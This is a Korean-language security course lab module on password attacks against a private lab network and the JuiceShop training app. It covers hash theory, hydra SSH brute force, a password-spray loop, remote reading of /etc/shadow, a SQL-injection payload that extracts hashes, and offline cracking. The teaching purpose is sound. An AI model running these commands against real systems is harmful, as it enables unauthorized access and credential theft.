# Week 04: 패스워드 공격

## 학습 목표
- 패스워드 공격의 유형(온라인, 오프라인, 사전, 브루트포스)을 체계적으로 분류하고 각각의 특징을 설명할 수 있다
- 패스워드 해시 함수(MD5, SHA, bcrypt, Argon2)의 차이와 보안 강도를 이해한다
- hydra를 사용하여 SSH 온라인 브루트포스 공격을 수행할 수 있다
- hashcat/john을 사용하여 오프라인 해시 크래킹을 수행할 수 있다
- JuiceShop에서 추출한 해시를 실제로 크래킹하는 전체 과정을 수행할 수 있다
- 패스워드 정책 수립과 방어 기법을 이해하고 적용할 수 있다
- MITRE ATT&CK의 Credential Access 전술과 기법을 매핑할 수 있다

## 전제 조건
- Week 01-03 완료 (정찰, 취약점 스캐닝, 웹 공격 경험)
- Linux 사용자 인증 체계 기본 이해 (/etc/passwd, /etc/shadow)
- 해시 함수의 기본 개념 (일방향 함수, 충돌)
- Week 03에서 SQLi로 추출한 해시 데이터 보유

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 패스워드 공격 이론 + 해시 함수 | 강의 |
| 0:40-1:10 | 공격 도구 소개 + 사전/규칙 기반 공격 | 강의 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 온라인 브루트포스 실습 (hydra) | 실습 |
| 2:00-2:30 | 오프라인 해시 크래킹 실습 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | 종합 패스워드 공격 시나리오 실습 | 실습 |
| 3:10-3:40 | 방어 기법 + 퀴즈 + 과제 안내 | 토론/퀴즈 |

---

# Part 1: 패스워드 공격 이론 (40분)

## 1.1 패스워드 공격 개요

패스워드 공격은 사용자의 인증 정보를 탈취하거나 추측하여 시스템에 무단 접근하는 공격이다.

**MITRE ATT&CK 매핑:**
```
전술: TA0006 — Credential Access (인증 정보 접근)
  +-- T1110 — Brute Force
  |     +-- T1110.001 — Password Guessing (온라인 추측)
  |     +-- T1110.002 — Password Cracking (오프라인 크래킹)
  |     +-- T1110.003 — Password Spraying (스프레이 공격)
  |     +-- T1110.004 — Credential Stuffing (재사용 공격)
  +-- T1003 — OS Credential Dumping
  |     +-- T1003.008 — /etc/passwd and /etc/shadow
  +-- T1552 — Unsecured Credentials
        +-- T1552.001 — Credentials In Files
        +-- T1552.003 — Bash History
```

### 패스워드 공격 분류

| 유형 | 방식 | 속도 | 탐지 | 예시 도구 |
|------|------|------|------|---------|
| **온라인 브루트포스** | 서비스에 직접 로그인 시도 | 느림 (네트워크 지연) | 쉬움 (로그) | hydra, medusa |
| **오프라인 크래킹** | 해시를 로컬에서 역산 | 빠름 (GPU 활용) | 불가능 | hashcat, john |
| **사전 공격** | 단어 목록으로 시도 | 중간 | 중간 | hydra + wordlist |
| **레인보우 테이블** | 사전 계산된 해시 매칭 | 매우 빠름 | 불가능 | RainbowCrack |
| **패스워드 스프레이** | 1개 비밀번호로 다수 계정 | 느림 | 어려움 | hydra, sprayhound |
| **크레덴셜 스터핑** | 유출된 자격증명 재사용 | 빠름 | 중간 | custom scripts |

### 공격 유형별 상세 비교

```
[온라인 브루트포스]
  공격자 → SSH/HTTP 로그인 시도 → 서버
  한계: 계정 잠금, 시간 제한, 로그 기록
  속도: ~10-100 시도/초

[오프라인 크래킹]
  공격자 → 해시 파일 획득 → 로컬에서 계산
  한계: 해시 알고리즘 강도에 의존
  속도: MD5 ~10억/초(GPU), bcrypt ~10만/초(GPU)

[패스워드 스프레이]
  공격자 → 모든 사용자에게 "Password1!" 시도
  한계: 계정별 시도 횟수가 적어 잠금 회피
  탐지: 동일 비밀번호, 다수 계정 → 패턴 분석 필요
```

## 1.2 패스워드 해시 함수

### 해시 함수의 역할

```
사용자 입력: "admin123"
     ↓ 해시 함수
DB 저장: "0192023a7bbd73250516f069df18b500" (MD5)
     ↓
검증: 입력 해시 == 저장 해시? → 인증 성공/실패
```

### 해시 함수 비교

| 알고리즘 | 출력 길이 | 솔트 | 반복 | GPU 속도 | 보안성 |
|---------|---------|------|------|---------|--------|
| **MD5** | 32 hex | 없음 | 1회 | ~10억/초 | 매우 취약 |
| **SHA-1** | 40 hex | 없음 | 1회 | ~5억/초 | 취약 |
| **SHA-256** | 64 hex | 없음 | 1회 | ~3억/초 | 취약 (단순 사용 시) |
| **SHA-512** | 128 hex | 있음 (Linux) | 5000회 | ~50만/초 | 중간 |
| **bcrypt** | 60 char | 내장 | 가변 (cost) | ~10만/초 | 강함 |
| **scrypt** | 가변 | 내장 | 가변 | ~1만/초 | 매우 강함 |
| **Argon2** | 가변 | 내장 | 가변 | ~5천/초 | 최강 |

### 솔트(Salt)의 중요성

```
[솔트 없는 경우]
"admin123" → MD5 → "0192023a7bbd73250516f069df18b500"
같은 비밀번호 = 같은 해시 → 레인보우 테이블로 즉시 크래킹

[솔트 있는 경우]
"admin123" + "x7k2m9" → MD5 → "a8f5f167f44f4964e6c998dee827110c"
"admin123" + "p3q8n1" → MD5 → "b2d73fe41872ba6843e3f8e8b1297ece"
같은 비밀번호 + 다른 솔트 = 다른 해시 → 레인보우 테이블 무효화
```

### Linux 패스워드 해시 형식 (/etc/shadow)

```
$6$rounds=5000$salt$hash
 |  |            |     +-- 해시 결과
 |  |            +-- 솔트 값
 |  +-- 반복 횟수
 +-- 알고리즘 식별자

식별자:
  $1$  = MD5 (취약)
  $5$  = SHA-256
  $6$  = SHA-512 (현재 기본)
  $2b$ = bcrypt
  $y$  = yescrypt (최신 Ubuntu)
```

## 1.3 사전(Wordlist) 파일

### 주요 사전 파일

| 사전 | 크기 | 내용 | 경로 |
|------|------|------|------|
| **rockyou.txt** | 14M | 유출된 실제 비밀번호 1,430만 개 | /usr/share/wordlists/ |
| **SecLists** | 수GB | 다양한 카테고리별 사전 | github.com/danielmiessler |
| **CeWL 생성** | 가변 | 대상 웹사이트에서 추출한 단어 | 커스텀 생성 |

### 사전 공격의 효과

```
rockyou.txt의 상위 10개 비밀번호:
  1. 123456        (290,729건)
  2. 12345         (79,076건)
  3. 123456789     (76,789건)
  4. password      (59,462건)
  5. iloveyou      (49,952건)
  6. princess      (33,291건)
  7. 1234567       (21,726건)
  8. rockyou       (20,901건)
  9. 12345678      (20,553건)
  10. abc123       (16,648건)

실제 환경에서 사전 공격 성공률: 약 60-80% (약한 패스워드 정책 시)
```

## 1.4 공격 도구 소개

### hydra (온라인 브루트포스)

| 항목 | 설명 |
|------|------|
| 용도 | 네트워크 서비스 온라인 브루트포스 |
| 지원 프로토콜 | SSH, FTP, HTTP, SMTP, MySQL, RDP, VNC 등 50+ |
| 장점 | 다양한 프로토콜 지원, 병렬 처리 |
| 단점 | 느림 (네트워크 의존), 계정 잠금 위험 |

### hashcat 공격 모드

| 모드 | 번호 | 설명 | 예시 |
|------|------|------|------|
| Dictionary | 0 | 사전 파일 사용 | -a 0 -w wordlist.txt |
| Combination | 1 | 사전 2개 조합 | -a 1 dict1.txt dict2.txt |
| Brute-force | 3 | 문자 조합 전수조사 | -a 3 ?a?a?a?a?a?a |
| Rule-based | 0+rules | 사전 + 변환 규칙 | -a 0 -r rules/best64.rule |
| Hybrid | 6,7 | 사전 + 브루트포스 혼합 | -a 6 dict.txt ?d?d?d |

---

# Part 2: 공격 도구 상세 + 사전/규칙 기반 공격 (30분)

## 2.1 hydra 옵션 상세

| 옵션 | 설명 | 예시 |
|------|------|------|
| `-l` | 단일 사용자명 | `-l admin` |
| `-L` | 사용자명 목록 파일 | `-L users.txt` |
| `-p` | 단일 비밀번호 | `-p password` |
| `-P` | 비밀번호 목록 파일 | `-P /usr/share/wordlists/rockyou.txt` |
| `-t` | 병렬 연결 수 | `-t 4` |
| `-f` | 첫 성공 시 중지 | `-f` |
| `-V` | 상세 출력 | `-V` |
| `-s` | 포트 지정 | `-s 2222` |
| `-e` | 추가 검사 | `-e nsr` (null, same, reverse) |

### 프로토콜별 사용법

```bash
# SSH 브루트포스
hydra -l user -P wordlist.txt ssh://10.20.30.80

# HTTP POST 폼 브루트포스
hydra -l admin -P wordlist.txt 10.20.30.80 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# FTP 브루트포스
hydra -l anonymous -P wordlist.txt ftp://10.20.30.80

# HTTP Basic Auth
hydra -l admin -P wordlist.txt 10.20.30.80 http-get /admin
```

## 2.2 hashcat 해시 타입 코드

| 코드 | 해시 타입 | 예시 해시 |
|------|---------|---------|
| 0 | MD5 | 0192023a7bbd73250516f069df18b500 |
| 100 | SHA-1 | aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d |
| 1400 | SHA-256 | e3b0c44298fc1c149... |
| 1800 | sha512crypt ($6$) | $6$rounds=5000$salt$hash |
| 3200 | bcrypt | $2b$12$salt.hash |
| 1000 | NTLM | b4b9b02e6f09a9bd760f... |

## 2.3 규칙 기반 공격(Rule-based Attack)

단순 사전보다 효과적인 규칙 기반 변환:

| 규칙 | 설명 | 입력 | 출력 |
|------|------|------|------|
| `c` | 첫 글자 대문자 | password | Password |
| `$1` | 끝에 1 추가 | password | password1 |
| `$!` | 끝에 ! 추가 | password | password! |
| `^1` | 앞에 1 추가 | password | 1password |
| `sa@` | a를 @로 치환 | password | p@ssword |
| `se3` | e를 3으로 치환 | password | pass3ord |
| `l` | 모두 소문자 | PASSWORD | password |
| `u` | 모두 대문자 | password | PASSWORD |

**조합 예시:**
```
사전 단어: "password"
규칙 적용:
  c$1   → Password1
  c$!   → Password!
  sa@$1 → p@ssword1
  c$123 → Password123
  u     → PASSWORD
```

---

# Part 3: 온라인 브루트포스 실습 (40분)

## 실습 3.1: SSH 브루트포스 (hydra)

### Step 1: 사전 파일 준비

> **실습 목적**: 효과적인 브루트포스를 위한 사전 파일을 준비하고, 실습 환경에 맞는 크기로 조정한다.
>
> **배우는 것**: 사전 파일의 구조와 커스터마이징

```bash
# rockyou.txt 압축 해제 (아직 안 된 경우)
if [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
    echo 1 | sudo -S gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
fi

# 실습용 소형 사전 파일 생성 (상위 1000개 + 커스텀)
head -1000 /usr/share/wordlists/rockyou.txt > /tmp/small_wordlist.txt 2>/dev/null

# 실습 환경 비밀번호 추가 (테스트 목적)
echo -e "1\nadmin\npassword\nroot\ntest\nopsclaw\nubuntu" >> /tmp/small_wordlist.txt

# 사전 파일 크기 확인
wc -l /tmp/small_wordlist.txt
# 예상 출력: ~1007 lines

# 사용자명 리스트 생성
echo -e "root\nadmin\nopsclaw\nweb\nsecu\nsiem\nubuntu\ntest" > /tmp/users.txt
```

> **결과 해석**:
> - rockyou.txt: 2009년 RockYou 사이트에서 유출된 실제 비밀번호 목록
> - 실습용으로 상위 1000개만 추출 (시간 절약)
> - 커스텀 비밀번호 추가: 실습 환경의 비밀번호가 사전에 포함되도록
>
> **실전 활용**: 실무에서는 대상 조직의 언어, 문화, 회사명 등을 반영한 커스텀 사전을 만든다.
>
> **트러블슈팅**:
> - rockyou.txt가 없음: `sudo apt install wordlists` 또는 직접 다운로드

### Step 2: SSH 브루트포스 실행

> **실습 목적**: hydra를 사용하여 SSH 서비스에 대한 사전 기반 브루트포스를 수행한다.
>
> **배우는 것**: hydra의 SSH 브루트포스 실행 방법과 결과 해석

```bash
# web 서버 SSH 브루트포스 (단일 사용자)
hydra -l web -P /tmp/small_wordlist.txt ssh://10.20.30.80 -t 4 -f -V 2>&1 | tail -20
# 예상 출력:
# [22][ssh] host: 10.20.30.80   login: web   password: 1
# 1 of 1 target successfully completed, 1 valid password found

# secu 서버 SSH 브루트포스
hydra -l secu -P /tmp/small_wordlist.txt ssh://10.20.30.1 -t 4 -f 2>&1 | tail -10
# 예상 출력:
# [22][ssh] host: 10.20.30.1   login: secu   password: 1

# 다중 사용자 + 다중 비밀번호
hydra -L /tmp/users.txt -P /tmp/small_wordlist.txt ssh://10.20.30.80 -t 4 -f 2>&1 | tail -15
# 예상 출력: 발견된 유효 자격증명 목록
```

> **결과 해석**:
> - `[22][ssh]`: 포트 22의 SSH 서비스에서 발견
> - `login: web password: 1`: 사용자명 "web", 비밀번호 "1"로 성공
> - 비밀번호가 "1"인 것은 매우 약한 비밀번호 → 즉시 크래킹됨
>
> **실전 활용**: 모의해킹에서 SSH 브루트포스는 가장 기본적인 접근법이다.
>
> **명령어 해설**:
> - `-l web`: 사용자명 "web" 고정
> - `-P /tmp/small_wordlist.txt`: 비밀번호 목록 파일
> - `-t 4`: 4개 병렬 연결
> - `-f`: 첫 번째 성공 시 즉시 중지
> - `-V`: 모든 시도를 출력
>
> **트러블슈팅**:
> - "Connection refused": SSH 서비스가 꺼져 있음
> - "Too many authentication failures": 서버가 연결을 차단 → `-t 1`로 줄이기

### Step 3: 패스워드 스프레이 공격

> **실습 목적**: 단일 비밀번호를 여러 계정에 시도하는 스프레이 공격을 이해한다.
>
> **배우는 것**: 브루트포스와 스프레이의 차이, 계정 잠금 우회 전략

```bash
# 패스워드 스프레이: 비밀번호 "1"을 모든 서버의 모든 사용자에 시도
echo "=== 패스워드 스프레이 공격 ==="
for host in 10.20.30.1 10.20.30.80 10.20.30.100; do
    for user in root admin web secu siem opsclaw; do
        result=$(sshpass -p1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 ${user}@${host} "echo SUCCESS" 2>/dev/null)
        if [ "$result" = "SUCCESS" ]; then
            echo "  [SUCCESS] ${user}@${host} password: 1"
        fi
    done
done
# 예상 출력:
# [SUCCESS] secu@10.20.30.1 password: 1
# [SUCCESS] web@10.20.30.80 password: 1
# [SUCCESS] siem@10.20.30.100 password: 1
```

> **결과 해석**:
> - 동일한 약한 비밀번호("1")가 여러 서버에서 사용됨
> - 스프레이 공격은 계정당 1-2번만 시도하므로 잠금 정책을 회피
>
> **실전 활용**: 기업 환경에서 "Season+Year" 패턴(Summer2025!)이 흔히 사용된다.

## 실습 3.2: 오프라인 해시 크래킹

### Step 1: 해시 추출 및 식별

> **실습 목적**: 다양한 소스에서 패스워드 해시를 추출하고 해시 타입을 식별한다.
>
> **배우는 것**: 해시 식별법과 크래킹 준비 과정

```bash
# Week 03에서 추출한 JuiceShop 해시 (MD5)
echo "0192023a7bbd73250516f069df18b500" > /tmp/hashes_md5.txt
echo "e541b3fa16e5af0c97e0f6a94dc3fe30" >> /tmp/hashes_md5.txt
cat /tmp/hashes_md5.txt

# 해시 타입 식별
echo "=== 해시 타입 식별 ==="
echo "32자리 hex = MD5 가능성 높음"
echo "40자리 hex = SHA-1 가능성 높음"
echo "64자리 hex = SHA-256 가능성 높음"
echo "\$6\$ 접두사 = SHA-512 (Linux)"
echo "\$2b\$ 접두사 = bcrypt"

# hashid 도구로 자동 식별 (설치된 경우)
hashid "0192023a7bbd73250516f069df18b500" 2>/dev/null || echo "hashid 미설치: 수동 식별 필요"
```

> **결과 해석**:
> - 32자리 16진수 문자열은 MD5 해시일 가능성이 높다
> - JuiceShop은 비밀번호를 단순 MD5로 저장 (매우 취약)

### Step 2: MD5 해시 크래킹

> **실습 목적**: 추출한 MD5 해시를 사전 공격으로 크래킹한다.
>
> **배우는 것**: hashcat/john the ripper의 기본 사용법

```bash
# 방법 1: john the ripper로 크래킹
echo "admin:0192023a7bbd73250516f069df18b500" > /tmp/john_hashes.txt
john --format=raw-md5 --wordlist=/tmp/small_wordlist.txt /tmp/john_hashes.txt 2>/dev/null
# 예상 출력:
# admin123         (admin)

# john 결과 확인
john --format=raw-md5 --show /tmp/john_hashes.txt 2>/dev/null
# 예상 출력: admin:admin123

# 방법 2: hashcat으로 크래킹 (CPU 모드)
hashcat -m 0 -a 0 /tmp/hashes_md5.txt /tmp/small_wordlist.txt --force 2>/dev/null | tail -10
# 예상 출력:
# 0192023a7bbd73250516f069df18b500:admin123
# Status.........: Cracked

# 방법 3: 직접 비교 (교육용)
echo -n "admin123" | md5sum
# 예상 출력: 0192023a7bbd73250516f069df18b500  -
# → JuiceShop에서 추출한 해시와 일치!
```

> **결과 해석**:
> - MD5 해시 크래킹은 매우 빠르다 (사전에 있으면 1초 미만)
> - `admin123`이라는 약한 비밀번호가 크래킹됨
>
> **명령어 해설**:
> - `john --format=raw-md5`: MD5 해시 형식 지정
> - `hashcat -m 0`: 해시 타입 MD5 (코드 0)
> - `-a 0`: 사전 공격 모드
> - `--force`: GPU 없이 CPU로 실행 (실습용)
>
> **트러블슈팅**:
> - "No hashes loaded": 해시 형식이 맞지 않음 → format 확인
> - hashcat "clGetPlatformIDs" 에러: GPU 드라이버 없음 → `--force`로 CPU 사용

### Step 3: Linux shadow 해시 크래킹

> **실습 목적**: Linux 시스템의 /etc/shadow 파일에서 추출한 해시를 크래킹한다.
>
> **배우는 것**: Linux 패스워드 해시 구조와 크래킹 방법

```bash
# /etc/shadow에서 해시 추출 (web 서버)
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "echo 1 | sudo -S cat /etc/shadow 2>/dev/null" | grep -E "^(web|root):" > /tmp/shadow_hashes.txt
cat /tmp/shadow_hashes.txt

# unshadow 명령으로 john 형식 변환
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "cat /etc/passwd" | grep -E "^(web|root):" > /tmp/passwd_entries.txt
unshadow /tmp/passwd_entries.txt /tmp/shadow_hashes.txt > /tmp/unshadowed.txt 2>/dev/null

# john으로 크래킹 시도
john --wordlist=/tmp/small_wordlist.txt /tmp/unshadowed.txt 2>/dev/null | tail -10
# 예상 출력:
# 1                (web)
```

> **결과 해석**:
> - `$y$`는 yescrypt 해시 (최신 Ubuntu 기본)
> - yescrypt는 bcrypt보다 강한 해시이지만, 비밀번호가 "1"이면 즉시 크래킹
> - 해시 알고리즘이 강해도 비밀번호가 약하면 무의미

---

# Part 4: 종합 패스워드 공격 시나리오 (30분)

## 실습 4.1: 엔드투엔드 패스워드 공격 시나리오

### Step 1: 정보 수집 → 해시 추출 → 크래킹 → 접근

> **실습 목적**: 패스워드 공격의 전체 체인을 통합 실행한다.
>
> **배우는 것**: 실제 모의해킹에서의 패스워드 공격 워크플로

```bash
echo "=== 패스워드 공격 체인 ==="

# Phase 1: SQLi로 해시 추출
echo "[Phase 1] JuiceShop에서 사용자 해시 추출"
HASHES=$(curl -s "http://10.20.30.80:3000/rest/products/search?q='))%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--" 2>/dev/null)
echo "$HASHES" | python3 -c "
import sys,json
try:
    items = json.load(sys.stdin).get('data',[])
    for item in items[:5]:
        name = item.get('name','')
        desc = item.get('description','')
        if '@' in str(name) and len(str(desc))==32:
            print(f'  {name}:{desc}')
except: pass
" 2>/dev/null

# Phase 2: 해시 크래킹 (MD5)
echo "[Phase 2] MD5 해시 크래킹"
echo -n "admin123" | md5sum | awk '{print $1}'

# Phase 3: SSH 브루트포스
echo "[Phase 3] SSH 서비스 접근"
hydra -l web -p 1 ssh://10.20.30.80 -f 2>&1 | grep "successfully"

# Phase 4: 크레덴셜 재사용 확인
echo "[Phase 4] 비밀번호 재사용 확인"
for host in 10.20.30.1 10.20.30.80 10.20.30.100; do
    result=$(sshpass -p1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 $(echo $host | sed 's/10.20.30.1$/secu/;s/10.20.30.80$/web/;s/10.20.30.100$/siem/')@$host "echo OK" 2>/dev/null)
    [ "$result" = "OK" ] && echo "  [재사용 확인] $host — 비밀번호 '1' 유효"
done

echo "[완료] 패스워드 공격 체인 종료"
```

### Step 2: OpsClaw를 활용한 자동화

> **실습 목적**: 패스워드 감사를 OpsClaw로 자동화한다.
>
> **배우는 것**: 보안 감사 자동화의 실제 적용

```bash
RESULT=$(curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{"name":"week04-password-audit","request_text":"패스워드 보안 감사","master_mode":"external"}')
PID=$(echo $RESULT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")

curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: opsclaw-api-key-2026" > /dev/null

curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsclaw-api-key-2026" \
  -d '{
    "tasks": [
      {"order":1,"title":"SSH 인증방식 확인","instruction_prompt":"nmap --script=ssh-auth-methods -p 22 10.20.30.80 2>/dev/null | tail -10","risk_level":"low","subagent_url":"http://localhost:8002"},
      {"order":2,"title":"비밀번호 정책 확인","instruction_prompt":"sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \"cat /etc/pam.d/common-password 2>/dev/null | grep -v ^#\" 2>/dev/null","risk_level":"low","subagent_url":"http://localhost:8002"},
      {"order":3,"title":"shadow 해시 유형 확인","instruction_prompt":"sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \"echo 1 | sudo -S cat /etc/shadow 2>/dev/null\" 2>/dev/null | grep web | cut -d: -f2 | cut -c1-4","risk_level":"medium","subagent_url":"http://localhost:8002"}
    ],
    "subagent_url":"http://localhost:8002"
  }' | python3 -c "
import sys,json
d=json.load(sys.stdin)
print(f'결과: {d[\"overall\"]}')
for t in d.get('task_results',[]):
    print(f'  [{t[\"order\"]}] {t[\"title\"]:25s} → {t[\"status\"]}')
"
```

### Step 3: 방어 관점 — 패스워드 정책 점검

> **실습 목적**: 현재 시스템의 패스워드 정책을 점검하고 강화 방안을 제시한다.
>
> **배우는 것**: Linux 패스워드 정책 설정과 모범 사례

```bash
# PAM 비밀번호 정책 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "cat /etc/pam.d/common-password 2>/dev/null | grep -v '^#' | grep -v '^$'"

# 비밀번호 만료 정책 확인
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "chage -l web 2>/dev/null"
# 예상 출력:
# Password expires: never  ← 만료 없음 (취약)
# Maximum number of days between password change: 99999

# SSH 설정 확인 (비밀번호 인증 여부)
sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
  "cat /etc/ssh/sshd_config 2>/dev/null | grep -i 'PasswordAuthentication\|MaxAuthTries\|LoginGraceTime'"
# 예상 출력:
# PasswordAuthentication yes  ← 비밀번호 인증 허용 (취약)
# MaxAuthTries 6              ← 최대 6회 시도 허용
```

> **결과 해석**:
> - `Password expires: never`: 비밀번호가 만료되지 않음 → 유출된 비밀번호 무기한 유효
> - `PasswordAuthentication yes`: 비밀번호 인증 허용 → 브루트포스 대상
> - `MaxAuthTries 6`: 6번 시도 가능 → 매우 관대한 설정

---

## 검증 체크리스트
- [ ] hydra로 SSH 브루트포스를 성공적으로 수행했는가
- [ ] 패스워드 스프레이 공격의 원리를 이해하고 실행했는가
- [ ] MD5 해시를 john 또는 hashcat으로 크래킹했는가
- [ ] Linux shadow 해시 구조($y$, $6$ 등)를 이해했는가
- [ ] SQLi → 해시 추출 → 크래킹 → 접근의 전체 체인을 수행했는가
- [ ] 패스워드 정책(PAM, SSH 설정)을 점검했는가
- [ ] OpsClaw를 통해 패스워드 감사를 자동화했는가
- [ ] 방어 기법(키 인증, 비밀번호 정책, 계정 잠금)을 이해했는가

## 자가 점검 퀴즈

1. 온라인 브루트포스와 오프라인 크래킹의 핵심 차이를 속도, 탐지 가능성, 필요 조건 측면에서 비교하라.

2. 패스워드 스프레이 공격이 일반 브루트포스보다 탐지가 어려운 이유를 설명하라.

3. bcrypt가 MD5보다 패스워드 해시에 적합한 이유를 3가지 설명하라.

4. 솔트(Salt)가 레인보우 테이블 공격을 방어하는 원리를 설명하라.

5. hydra에서 `-t 64`로 병렬 연결을 높이면 어떤 문제가 발생할 수 있는가?

6. hashcat의 규칙 기반 공격이 단순 사전 공격보다 효과적인 이유를 설명하라.

7. `/etc/shadow`의 `$6$rounds=5000$salt$hash` 형식을 각 필드별로 해석하라.

8. 크레덴셜 스터핑(Credential Stuffing) 공격의 전제 조건과 방어 방법을 설명하라.

9. 모범적인 패스워드 정책의 5가지 요소를 나열하고 각각의 근거를 설명하라.

10. MFA(다중 인증)가 패스워드 공격을 방어하는 원리를 설명하고, MFA도 우회 가능한 시나리오를 제시하라.

## 과제

### 과제 1: 패스워드 보안 감사 보고서 (필수)
- 4개 서버의 SSH 인증 설정, 비밀번호 정책, 해시 유형을 조사
- hydra를 사용하여 각 서버의 비밀번호 강도를 테스트
- 발견된 취약점과 대응 권장사항을 보고서로 작성

### 과제 2: 해시 크래킹 실습 (선택)
- JuiceShop에서 SQLi로 추출한 사용자 해시 5개 이상 크래킹
- 사용한 도구, 사전 파일, 소요 시간을 기록
- MD5와 bcrypt 해시의 크래킹 속도 차이를 비교 분석

### 과제 3: 커스텀 사전 생성 (도전)
- CeWL 또는 수동으로 대상 웹사이트에서 단어를 추출
- 규칙 기반 변환을 적용한 커스텀 사전 생성
- 생성한 사전으로 크래킹 테스트 수행 후 효과를 분석
